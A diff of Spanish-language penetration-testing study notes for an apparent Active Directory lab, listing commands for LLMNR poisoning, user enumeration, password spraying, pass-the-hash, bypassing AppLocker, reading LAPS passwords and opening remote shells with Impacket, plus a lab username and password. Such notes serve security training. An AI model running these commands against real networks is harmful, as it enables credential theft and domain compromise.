@@ -27,6 +27,7 @@ Mails		-> intext:"@dominio" inurl:<dominio>
 
 ----------	----------	----------	----------
 	### Enumeracion inicial
+
 ## Enumeracion pasiva
 sudo -E wireshark
 sudo tcpdump -i <red>
@@ -34,11 +35,12 @@ sudo responder -I ens224 -A
 #Estos tools van a permitirnos escuchar la red y ver que esta pasando en ella a su vez de poder identificar nuevos hosts. Es importante probar distintos tools para asegurarnos de eencontr la mayor cantidad posible de hosts
 #Mucha atencion a la flag -A usada en responder para hacer un analisis pasivo de la red.
 
+----------
 ## Enumeracion activa
 fping -asgq 172.16.5.0/23
 #Chequeo activo de la red. con -g se usa cidr block. Hace ping a toda esa subnet pasada
 
-Dentro de aca tambien entra la enumeracion mediante nmap
+-> Dentro de aca tambien entra la enumeracion mediante nmap
 
 sudo git clone https://github.com/ropnop/kerbrute.git
 sudo make all
@@ -46,8 +48,6 @@ sudo make all
 kerbrute userenum -d DOMINIO.LOCAL --dc <IP_dc> <user dic txt> -o valid_ad_users
 #Enumeracion de usuarios contra el DC
 
-----------	----------	----------	----------
-	### Enumeracion activa
 ## LLMNR/NBT-NS Poisioning desde Linux
 responder -I <adaptador de red>
 #Sin la flag -A se pone de forma activa a escuchar la red y responder a los hosts para que les den los hashed de auth
@@ -70,7 +70,8 @@ Consta del intento de loguearse a un servicio mediante el uso de una contraseña
 Para realizar este ataque correctamente priomero se necesita:
 -> Listado valido de usuarios de dominio
 -> Poliotica de contraseñas de la empresa
-   
+
+----------
 ## Obtener politica de contraseñas Linux
 crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
 #Enumeracion de politica de contraseñas con credenciales validas
@@ -87,6 +88,7 @@ enum4linux-ng -P 172.16.5.5 -oA ilfreight
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 #En configuraciones viejas de ldap es posible retrive data sin auth. De esta forma se soliciat la politica de pwd
 
+----------
 ## Obtener politica de contraseñas Windows
 net accounts
 #En CMD. Devuelve info de la poltica como longitud, cata cuanto expira, intento maximos antes de ser bloqueado, etc.
@@ -138,7 +140,7 @@ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de
 #Si tenemos el hash NT de un admin de cuenta local (no dominio). Es recomendable verificar dicho hash en toda la subnet con la flag --loca-auth para que el tool solo intente logearse 1 vez en cada maquina
 #Tecnica muy ruidosa. Cuidado
 
-----------  ----------  ----------  ----------
+----------
 	### Password Spraying from Windows
 En el caso de que estemos en una maquuina windows, el uso del tool DomainPasswordSpray puede ayudarnos. https://github.com/dafthack/DomainPasswordSpray
 Si estamos autenticados, el tool genera una lista de usuarios, consulta la politica de pwd y ejecuta el Sprying sin bloquear las cuentas.
@@ -148,3 +150,84 @@ Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 #Ejemplo del uso de tool estando autenticado en el dominio
 #En el caso de no estarlo, se le pasa con la flag de la explicaion (-UserList) la lista de usuarios validos
+
+----------  ----------  ----------  ----------
+	### Enumerating Security Controls
+Get-MpComputerStatus
+#En windows, consultando con el comando anterior podemos saber si el "Real time protection" esta habiliatado o no. Esto es el windows defender
+
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+#Applocker es una aplicacion de Widnows que permite establecer una lista blanca con los sw que se pueden ejecutar en el sistema. Controla .exe, scripts, dlls, instaladores, etc
+#Algunas empresas bloquean PowerShell.exe pero no bloquean otras localizaciones de powershell como: "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" o "PowerShell_ISE.exe"
+
+Find-LAPSDelegatedGroups
+#LAPS permite hacer random y rotar las contraseñas de admin evitando el movimiento lateral.
+#Enumerar los usuarios que pueden leer esto sirve para saber a que usuario apuntar
+Find-AdmPwdExtendedRights
+#El comando anterior permite revisar los permisos de cada computadora con LAPS habilitado para cada grupo con acceso de lectura.
+Get-LAPSComputers
+#Este comando permite saber las computadoras que tiene LAPS activado. Si nuestro usuario tiene permiso de lectura, muestra la pwd en cleartxt
+
+----------  ----------  ----------  ----------
+En este punto, ya con foothold en el sistema, hay que enumerar a profundidad con las credenciales obtenidas
+
+	### Enumeracion de credenciales from Linux
+Cheatsheet de tools: https://wadcoms.github.io/
+
+----------
+##Crackmapexec
+sudo crackmapexec smb 172.16.5.5 -u <usr valido> -p <pwd valida>
+--users
+#Con credenciales y la flag --user se puede enumerar usuarios de dominio en el sistema
+--group
+#Esta flag nos sirve para, nuevamente con credenciales validas, obtener la informacion de los grupos de dominio
+--loggedon-users
+#Igual que el primero pero enumerando los usuarios logueados en el sistema
+--shares
+#Permite enumerar los directorios con el respectivo permiso
+	-M spider_plus --share 'Directorio'
+	#Esto permite enumerar en profundidad el dirtectorio y listar el contenido del mismo.
+	#El output es exportado en /tmp/cme_spider_plus/
+
+----------
+##SMBmap
+-u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+#Permite enumerar los shares con los respectivos permiosos
+-R 'Directorio' --dir-only
+#Estas flags permiten enumerar el direrctorio especificado en profundiad y con la flag --dir-only se pide el listado solo de directorios.
+
+----------
+##Rpcclient 
+#([!] Mas info en txt attacking_rpc)
+
+----------
+##Impacket
+Psexec.py
+#Es un clon del tool sysinternals psexec. Crea un servicio mediante la subida de un ejecutable al dir ADMIN$, lo registra mediante RPC y windows control manager y, una vez establecida la comunicacion, genera una shell
+psexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125  
+#Sintaxis para el uso con credenciales. Genera shell en system32 dir
+
+wmiexec.py
+#Utiliza un shell semi interactiva ejecutando comandos mediante Windows management instrumentation. No sube archivos al sistema generando menos logs que otros modulos de impacket
+wmiexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
+#Sintaxis para el uso con credenciales
+
+windapsearch.py
+#Script de python que permite la enumeracion de usuraios, grupos y maquinas en un dominio Windows utilizando queries de LDAP
+python3 windapsearch.py --dc-ip 172.16.5.5 -u <usr>@inlanefreight.local -p <pwd> --da
+#La flag --da sirve para la enumeracion de miembros en el grupo domain admins
+-PU
+#Esta flag sirve para la enumeracion de usuarios con privilegios elevados
+
+Bloodhound.py
+https://github.com/fox-it/BloodHound.py
+#Tool que permite enumerar AD mas en profundidad que los anteriores desde windows o linux
+bloodhound-python -u '<usr>' -p '<pwd>' -ns 172.16.5.5 -d inlanefreight.local -c all
+#-c (o --collectionmethod) permite usar distintos metodos de coleccion de datos como grupos, localadmin, sesiones, etc (ver help para mas info)
+#-ns especifica la ip del DC
+#-d especifica el nombre del DC
+sudo neo4j start
+#Es la GUI del tool. Permite subir los archivos que se crearon luego de enumerar el dominio para que nos represente de forma grafica la composision de este.
+	Find Shortest Paths To Domain Admins
+	#Se puede correr queries como la anterior que permite generar un mapa del dominio el cual muestra el camino para comprometerlo
+
